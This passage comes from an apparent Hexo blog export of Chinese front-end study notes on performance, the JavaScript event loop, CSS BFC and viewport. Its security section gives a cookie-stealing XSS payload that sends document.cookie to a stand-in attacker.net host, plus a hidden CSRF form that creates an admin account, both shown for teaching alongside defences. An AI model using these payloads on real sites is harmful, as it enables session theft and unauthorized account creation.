requireJS、Seajs等\n```html\n//使用defer时，加载后续文档元素的过程和main.js的加载是并行的，但main.js的执行要在页面所有元素解析完成之后才开始执行\n<script src=\"/main.js\" defer></script> \n//使用async时，加载后续文档元素的过程和main.js的加载是并行的\n<script src=\"/main.js\" async></script>\n\n```\n### 使用base64编码\n小文件应转换成base64编码，如小图，字体文件，音频等，尽量减少http请求\n```css\n.class-name {\n   background-image : url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAMAAABxsOwqAAAAYFBMVEWnxwusyQukxQudwQyZvgyhxAyfwgyxzAsUHQGOuA0aJAERGAFIXwSTugyEqgtqhghQZgUwQQIpOQKbuguVtQuKrAuCowp2kQlheghTbQZHWQU7SwVAVgQ6TgQlLwMeKwFOemyQAAAAVElEQVQI1y3JVRaAIAAF0UconXbvf5ei8HfPDIQQhBAAFE10iKig3SLRNN4SP/p+N08VC0YnfIlNWtqIkhg/TPYbCvhqdHAWRXPZSp3g3CWZvVLXC6OJA3ukv0AaAAAAAElFTkSuQmCC');\n}\n\n```\n### 图片/视频懒加载\n为了保证页面内容的最小化，加速页面的渲染，尽可能节省移动端网络流量，页面中的图片资源推荐使用懒加载实现，在页面滚动时动态载入图片。\n```html\n<img data-src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a1604f3efd980\" alt=\"懒加载图片\" >\n```\n### 使用 iconfont 代替图片图标\n在页面中尽可能使用 iconfont 来代替图片图标，这样做的好处有以下几个：\n\n* 使用 iconfont 体积较小，而且是矢量图，因此缩放时不会失真；\n* 可以方便地修改图片大小尺寸和呈现颜色。\n\n## 页面渲染类\n### 把 CSS 资源引用放到 HTML 文件顶部\n一般推荐将所有 CSS 资源尽早指定在 HTML 文档 <head> 中，这样浏览器可以优先加载 CSS 并尽早完成页面渲染。\n### JavaScript 资源引用放到 HTML 文件底部\nJavaScript 资源放到 HTML 文档底部可以防止 JavaScript 的加载和解析执行对页面渲染造成阻塞。由于 JavaScript 资源默认是解析阻塞的，除非被标记为异步或者通过其他的异步方式加载，否则会阻塞 HTML DOM 解析和 CSS 渲染的过程。\n### 不要在 HTML 中直接缩放图片\n在 HTML 中直接缩放图片会导致页面内容的重排重绘，此时可能会使页面中的其他操作产生卡顿，因此要尽量减少在页面中直接进行图片缩放。\n### 减少 DOM 元素数量和深度\nHTML 中标签元素越多，标签的层级越深，浏览器解析 ** DOM** 并绘制到浏览器中所花的时间就越长，所以应尽可能保持 DOM 元素简洁和层级较少。\n```html\n<!--不推荐-->\n<div>\n  <span>\n    <a href=\"javascript: void(0);\">\n      <img src=\"./path/photo.jpg\" alt=\"图片\">\n    </a>\n  </span>\n</div>\n\n<!--推荐-->\n<img src=\"./path/photo.jpg\" alt=\"图片\">\n```\n### 尽量避免使用 table、iframe等慢元素\ntable内容的渲染是将 table 的 DOM 渲染树全部生成完并一次性绘制到页面上的，所以在长表格渲染时很耗性能，应该尽量避免使用它，可以考虑使用列表元素 ul 代替。尽量使用异步的方式动态添加 iframe 内资源的下载进程会阻塞父页面静态资源的下载与 CSS 及 HTML DOM的解析。\n### 避免运行耗时的 Javascript\n长时间运行的 JavaScript 会阻塞浏览器构建 DOM 树、DOM 渲染树、渲染页面。所以，任何与页面初次渲染无关的逻辑功能都应该延迟加载执行，这和 JavaScript 资源的异步加载思路是一致的。\n### 避免使用 CSS 表达式或 CSS 滤镜\nCSS 表达式或 CSS 滤镜的解析渲染速度是比较慢的，在有其他解决方案的情况下应该尽量避免使用。\n```css\n/* 不推荐 */\n.opacity {\n  filter:progid:DXImageTransform.Microsoft.Alpha(opacity=50);\n}\n```\n# 安全\n## xss和csrf的原理以及怎么预防\n### XSS\n用户浏览网页时发送错误，向服务器请求 URL，比如www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板中：`<p>sorry,an error occurred</p>`，返回给用户。\n\n这个漏洞有一个显著的特征，应用程序没有进行任何过滤或净化措施，就非常容易受到攻击。`www.xxx.com/error.php?message=<script>alert(1)</script>`，当用户打开错误页面时，就会出现`<p><script>alert(1)</script></p>`，弹出一个消息框。\n\n显然，攻击人员不会很傻的仅仅 alert 一些消息，在 IE 中，如果开启跨站点脚本检测可能无法弹出消息。通常 XSS 都会伴随着会话劫持，攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。\n比如攻击者构造一个这样的 URL，message 信息如下\n```js\nvar i = new Image;\ni.src=\"http://attacker.net/\"+document.cookie;\n```\n这样被攻击者通过访问这个恶意的 URL，就会把 cookie 发送给黑客，黑客截获 cookie，就能执行用户的任意操纵。\n### OSRF\n跨站点请求伪造才是跨站伪造的重点内容，攻击者只需要创建一个看似无害的网站，致使受害者的浏览器直接向易受攻击的服务器提交一个请求，执行恶意代码。\n仍然需要考虑同源策略，以管理员创建新用户为例，\n```txt\nPOST /newUser.php HTTP/1.1\nHost: xxx.com\nCookie: SessionId=...\nContent-Length: ..\n\nname=ro&userrole=admin&password=123456&confirmpassword=123456\n```\n黑客构造的网站会提交一个 form 表单，并想办法让 form 隐藏：\n```html\n<!DOCTYPE html>\n<html>\n<body>\n  <form action=\"http://xxx.com/newUser.php\" method=\"POST\">\n    <input type=\"hidden\" name=\"name\" value=\"ro\">\n    <input type=\"hidden\" name=\"userrole\" value=\"admin\">\n    <input type=\"hidden\" name=\"password\" value=\"123456\">\n    <input type=\"hidden\" name=\"confirmpassword\" value=\"123456\">\n  </form>\n</body>\n</html>\n```\n当管理员已经登陆的情况下，访问这个恶意网站的时候，就会提交这段脚本，管理员都不知情。因为管理员已经登陆，无需考虑 Cookie 的问题，一个简单的 CSRF 如此。\n**应对办法**\n1. 对一些关键字和特殊字符进行过滤或 URL、HTML 编码，\"<>?\"或\"script，javascript\"；\n2. Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；\n4. 验证HTTP Referer\n3. 在请求中添加 token 并验证","slug":"front-end-focus","published":1,"updated":"2018-03-02T03:58:08.552Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjvl0009i4ucg7prajbg","content":"<h1><span id=\"javascript篇\">javascript篇</span></h1>\n<h2><span id=\"prototype和__proto__的关系是什么\">prototype和__proto__的关系是什么</span></h2>\n<p>先看一段代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\"> name, age </span>) </span>&#123; </span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> p = <span class=\"keyword\">new</span> Person( <span class=\"string\">'xiaoming'</span>, <span class=\"number\">19</span> );</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( p.__proto__ == Person.prototype );</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p><code>__proto__</code>是每个对象都有的一个属性，而<code>prototype</code>是函数才会有的属性，查找资料后是这么描述<code>__proto__</code>的：</p>\n<blockquote>\n<p>对象具有属性<code>__proto__</code>，可称为隐式原型，一个对象的隐式原型指向构造该对象的构造函数的原型，这也保证了实例能够访问在构造函数原型中定义的属性和方法。</p>\n</blockquote>\n<p>而<code>prototype</code>是这么描述的</p>\n<blockquote>\n<p>方法(Function)这个特殊的对象，除了和其他对象一样有上述__proto__属性之外，还有自己特有的属性——原型属性（prototype），这个属性是一个指针，指向一个对象，这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）。原型对象也有一个属性，叫做constructor，这个属性包含了一个指针，指回原构造函数。</p>\n</blockquote>\n<p>用一张简单的图就能概括二者关系<br>\n<img src=\"20180228144215.jpg\" alt=\"示例\"></p>\n<h2><span id=\"javascript-异步-栈-事件循环-任务队列\">JavaScript 异步、栈、事件循环、任务队列</span></h2>\n<p>嗯，还是开局一张图<br>\n<img src=\"4020255170-59bc9e1671029_articlex.png\" alt=\"示例\"><br>\n有这么一段代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);</span><br><span class=\"line\">  bar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">3</span>)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<p>它在栈中的入栈、出栈过程，如下图：<br>\n<img src=\"1021884518-59bc9e30d414a_articlex.png\" alt=\"示例\"></p>\n<p>看到这里，我就联想到了平时使用浏览器的debug功能的时候，在断点处停住时能看到的<code>call stack</code>。<br>\n这里我们有个概念叫<strong>任务队列</strong>，js中，有两类任务队列：宏任务队列（macro tasks）和微任务队列（micro tasks）。宏任务队列可以有多个，微任务队列只有一个。下面是常见的一些任务的任务队列：</p>\n<ul>\n<li>宏任务：script（全局任务）, setTimeout, setInterval, setImmediate, I/O, UI rendering.</li>\n<li>微任务：process.nextTick, Promise, Object.observer, MutationObserver.<br>\n比如有这样的代码</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'timeout1'</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">resolve</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise1'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>; i++) &#123;</span><br><span class=\"line\">        i == <span class=\"number\">99</span> &amp;&amp; resolve();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise2'</span>);</span><br><span class=\"line\">&#125;).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'then1'</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'global1'</span>);</span><br></pre></td></tr></table></figure>\n<p>比如上面这样的一段代码，<code>setTimeout</code>是一个宏任务源，所以里面的回调函数<code>console.log('timeout1')</code>会被加到宏任务队列中。到了Promise，输出promise1以及promise2，for循环内执行resolve时，由于Promise是一个微任务源，所以<code>console.log('then1')</code>回调会被加到微任务队列中。继续执行代码，输出grobal1。这个时候，执行栈上的代码已经执行完毕，所以此时我们执行微任务队列，此时的微任务队列上有<code>console.log('then1')</code>，所以浏览器输出then1。至此，一轮的事件循环已经执行完毕，开启新的一轮事件循环。也是从<code>宏任务-&gt;执行栈-&gt;微任务</code>。由于此时宏任务上有事件<code>console.log('timeout1')</code>，所以输出timeout1。这就是整段代码执行情况的理解。依次输出如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promise1</span><br><span class=\"line\">promise2</span><br><span class=\"line\">global1</span><br><span class=\"line\">then1</span><br><span class=\"line\">timeout1</span><br></pre></td></tr></table></figure>\n<h3><span id=\"nodejs中的processnexttick和setimmediate\">nodejs中的process.nextTick和setImmediate</span></h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.nextTick(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">A</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">  process.nextTick(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">B</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);&#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timeout</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'TIMEOUT FIRED'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"comment\">// TIMEOUT FIRED</span></span><br></pre></td></tr></table></figure>\n<p>上面代码中，由于process.nextTick方法指定的回调函数，总是在当前&quot;执行栈&quot;的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前&quot;执行栈&quot;执行。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setImmediate(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  setImmediate(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">A</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">    setImmediate(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">B</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);&#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timeout</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'TIMEOUT FIRED'</span>);</span><br><span class=\"line\">  &#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"comment\">// TIMEOUT FIRED</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n<p>上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1–TIMEOUT FIRED–2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行</p>\n<p>我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前&quot;执行栈&quot;一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>\n<h2><span id=\"事件模型\">事件模型</span></h2>\n<h3><span id=\"dom0级模型\">DOM0级模型</span></h3>\n<p>又称为原始事件模型，在该模型中，事件不会传播，即没有事件流的概念。事件绑定监听函数比较简单, 有两种方式:</p>\n<ul>\n<li>HTML代码中直接绑定:</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"fun()\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过JS代码指定属性值:</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> btn = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'.btn'</span>);</span><br><span class=\"line\">btn.onclick = fun;</span><br><span class=\"line\"><span class=\"comment\">//移除监听函数：</span></span><br><span class=\"line\"></span><br><span class=\"line\">btn.onclick = <span class=\"literal\">null</span>;</span><br></pre></td></tr></table></figure>\n<h3><span id=\"dom2级模型\">DOM2级模型</span></h3>\n<p>属于W3C标准模型，现代浏览器(除IE6-8之外的浏览器)都支持该模型。在该事件模型中，一次事件共有三个过程:</p>\n<ul>\n<li>事件捕获阶段(capturing phase)。事件从document一直向下传播到目标元素, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。</li>\n<li>事件处理阶段(target phase)。事件到达目标元素, 触发目标元素的监听函数。</li>\n<li>事件冒泡阶段(bubbling phase)。事件从目标元素冒泡到document, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。</li>\n</ul>\n<p>事件绑定监听函数的方式如下:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addEventListener(eventType, handler, useCapture)</span><br></pre></td></tr></table></figure>\n<p>事件移除监听函数的方式如下:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">removeEventListener(eventType, handler, useCapture)</span><br></pre></td></tr></table></figure>\n<p>参数说明:</p>\n<ul>\n<li>eventType指定事件类型(不要加on)</li>\n<li>handler是事件处理函数</li>\n<li>useCapture是一个boolean用于指定是否在捕获阶段进行处理，一般设置为false与IE浏览器保持一致。</li>\n</ul>\n<h1><span id=\"css篇\">css篇</span></h1>\n<h2><span id=\"overflowhidden清除浮动原理\">overflow:hidden清除浮动原理</span></h2>\n<ul>\n<li>BFC （Block Formatting Context）全称是块级格式化上下文，用于对块级元素排版，默认情况下只有根元素（body)一个块级上下文，但是如果一个块级元素 设置了float:left，overflow:hidden或position:absolute样式，就会为这个块级元素生成一个独立的块圾上下文，就像在window全局作用域内，声明了一个function就会生成 一个独立的作用域一样，新开僻的BFC像是开僻了一个新的小宇宙，使这个块圾元素内部的排版完全独立隔绝。</li>\n<li>独立的块级上下文可以包裹浮动流，全部浮动子元素也不会引起容器高度塌陷，也就是说包含块会把浮动元素的高度也计算在内，所以不用清除浮动来撑起高度。</li>\n</ul>\n<p>如何触发BFC</p>\n<ol>\n<li>根元素</li>\n<li>float的值不为none</li>\n<li>overflow的值不为visible</li>\n<li>display的值为inline-block、table-cell、table-caption</li>\n<li>position的值为absolute或fixed</li>\n<li>display：table也认为可以生成BFC，其实这里的主要原因在于Table会默认生成一个匿名的table-cell，正是这个匿名的table-ccell生成了BFC</li>\n</ol>\n<p>BFC的应用</p>\n<ol>\n<li>解决margin重叠问题</li>\n</ol>\n<p>相邻的垂直元素同时设置了margin后，实际margin值会塌陷到其中较大的那个值。其根本原理就是它们处于同一个BFC，符合“属于同一个BFC的两个相邻元素的margin会发生重叠”的规则。</p>\n<ol start=\"2\">\n<li>解决浮动问题</li>\n</ol>\n<p>当在父元素中设置overflow:hidden时就会触发BFC，所以他内部的元素就不会影响外面的布局，BFC就把浮动的子元素高度当做了自己内部的高度去处理溢出，所以外面看起来是清除了浮动</p>\n<ol start=\"3\">\n<li>解决侵占浮动元素的问题</li>\n</ol>\n<p>当一个元素浮动，另一个元素不浮动时，浮动元素因为脱离文档流就会盖在不浮动的元素上。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box1</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: pink;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.box2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: skyblue;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"640.webp\" alt=\"pic\"><br>\n我们做如下修改：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: skyblue;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* 或者是 */</span></span><br><span class=\"line\"><span class=\"selector-class\">.box2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: skyblue;</span><br><span class=\"line\">  <span class=\"comment\">/* overflow: hidden; */</span></span><br><span class=\"line\">  <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"641.webp\" alt=\"pic\"><br>\n我们为非浮动元素建立BFC环境，根据BFC的不与float box重叠的规则，解决了侵占元素问题。</p>\n<p>这一特性，我认为还是很有用的，特别是应用在两栏布局上，对比我们常规为非浮动元素或非定位元素设置margin来挤开的方法，其优点在于不需要去知道浮动或定位元素的宽度。</p>\n<h2><span id=\"inline-block和float的共性和区别\">inline-block和float的共性和区别</span></h2>\n<p><strong>共性</strong>：</p>\n<ul>\n<li>inline-block: 是把一个元素的display设置为块状内联元素，意思就是说，让一个元素的容器inline展示，并且里面的内容block展示；inline属性使元素内联展示，内联元素设置宽度无效，相邻的inline元素会在一行显示不换行，直到本行排满为止。block的元素始终会独占一行，呈块状显示，可设置宽高。所以inline-block的元素就是宽高可设置，相邻的元素会在一行显示，直到本行排满，也就是让元素的容器属性为block，内容为inline。</li>\n<li>float： 设置元素的浮动为左或者右浮动，当设置元素浮动时，相邻元素会根据自身大小，排满一行，如果父容器宽度不够则会换行。当我们设置了元素的浮动时，这个元素就脱离了文档流，相邻元素会呈环绕装排列。</li>\n</ul>\n<p>两者共同点是都可以实现元素在一行显示，并且可以自由设置元素大小。</p>\n<p><strong>区别</strong>：</p>\n<ul>\n<li>inline-block: 水平排列一行，即使元素高度不一，也会以高度最大的元素高度为行高，即使高度小的元素周围留空，也不回有第二行元素上浮补位。可以设置默认的垂直对齐基线。</li>\n<li>float: 让元素脱离当前文档流，呈环绕装排列，如遇上行有空白，而当前元素大小可以挤进去，这个元素会在上行补位排列。默认是顶部对齐。</li>\n</ul>\n<h1><span id=\"html篇\">html篇</span></h1>\n<h2><span id=\"meta标签中的viewport\">meta标签中的Viewport</span></h2>\n<h3><span id=\"viewport-有几个属性\">Viewport 有几个属性</span></h3>\n<ul>\n<li>width：控制 viewport 的大小，你可以给它指定一个值，如：600，或者甚至还可以给它一个特殊的值，如：device-width，device-width为设备的宽度（单位为缩放为 100% 时的 CSS 的像素）。</li>\n<li>height：与 width 相对应，指定viewport 高度。</li>\n<li>initial-scale：初始缩放比例，也即是当页面第一次 load 的时候缩放比例。</li>\n<li>maximum-scale：允许用户缩放到的最大比例。</li>\n<li>minimum-scale：允许用户缩放到的最小比例。</li>\n<li>user-scalable：是否允许用户手动缩放。</li>\n</ul>\n<h3><span id=\"viewport囊括了三个视窗\">Viewport囊括了三个视窗</span></h3>\n<h4><span id=\"视觉视窗\">视觉视窗</span></h4>\n<p>就是指代整个屏幕的可视区域，当然不包括浏览器的导航位置<br>\n<img src=\"meta-viewport-usage-1.jpg\" alt=\"实例\"></p>\n<h4><span id=\"布局视窗\">布局视窗</span></h4>\n<p>布局视窗跟视觉视窗不一样，它不是指设备屏幕区域，它是为了解决PC 端网站在移动端显示不佳的一个解决方案<br>\n<img src=\"meta-viewport-usage-2.jpg\" alt=\"实例\"></p>\n<h4><span id=\"理想视窗\">理想视窗</span></h4>\n<p>这个理想视窗是为了布局视窗而生的，为什么这么说，因为它是基于布局视窗的。他其实就是变了尺寸的布局视窗。理想视窗就是把布局视窗调整到合适的状态，让页面有最好的表面效果，这也是它名字的由来。设置了理想视窗用户就不再需要对页面进行缩放，因为浏览器已经帮你把页面调整到最佳的显示状态了。而你要做的就是告诉浏览器，你要他这么做就OK了。就下面这一段代码就可以让浏览器乖乖地把布局视窗调整到最理想的状态</p>\n<h1><span id=\"优化篇\">优化篇</span></h1>\n<h2><span id=\"网络加载类\">网络加载类</span></h2>\n<h3><span id=\"域名收敛\">域名收敛</span></h3>\n<p>对于PC 上的DNS 通常情况下就是几十ms. 因为PC可以存储很多的域名地址,而且TTL长着呢. 但是，对于手机端来说, 由于我们良心的3G和4G网络运营商节省开支的缘由, 一般在手机端上解析DNS 会到1s+. 所以，这样算下来， 首屏3s的最佳时间，你就已经没了1/3, 那还玩个屁. 不过，我们可以用很多预加载技术，比如localstorage,session,manifest等预先存储资源. 在PC上极度推崇domian sharding时, 在手机端上，此法不见得能行得通了.<br>\n所以, 一般来说，在手机端上的域名数不能超过5个。 基本上的分配就是<br>\nhtml +1<br>\ncss +1<br>\nimg +1<br>\njs +1<br>\nfonts +1<br>\n当然，这得看具体应用场景了.</p>\n<h3><span id=\"避免页面中空的-href-和-src\">避免页面中空的 href 和 src</span></h3>\n<p>当 link标签的 href 属性为空，或script、img、iframe标签的 src 属性为空时，浏览器在渲染的过程中仍会将 href 属性或 src 属性中的空内容进行加载，直到加载失败，这样就阻塞了页面中其他资源的下载进程，而且最终加载到的内容是无效的，因此要尽量避免。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 